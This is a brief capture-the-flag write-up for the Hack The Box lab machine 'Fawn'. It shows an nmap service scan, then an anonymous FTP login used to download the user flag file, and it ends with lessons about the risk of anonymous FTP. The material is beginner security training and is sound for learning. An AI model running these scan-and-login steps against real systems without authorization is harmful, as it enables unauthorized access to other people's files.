# HTB - Fawn Writeup
Gain initial access and capture the user flag by exploiting an exposed FTP service.

Nmap Scan 

nmap -sC -sV -Pn <target-ip>

Result:
Port 21/tcp open - FTP
Anonymous login allowed

Exploitation Steps
1. Connect to FTP
ftp <target-ip>
Username: anonymous
Password: (press Enter)

2. Browse and Download Files
ls
get user.txt

3. Exit FTP
bye

Flag
HTB{redacted}

Tools Used:

nmap
ftp (Linux terminal tool)

Lessons Learned:

Anonymous FTP access can lead to serious security issues.

Always test for login access when enumerating services.

FTP command-line usage is a useful skill for CTF and real-world testing

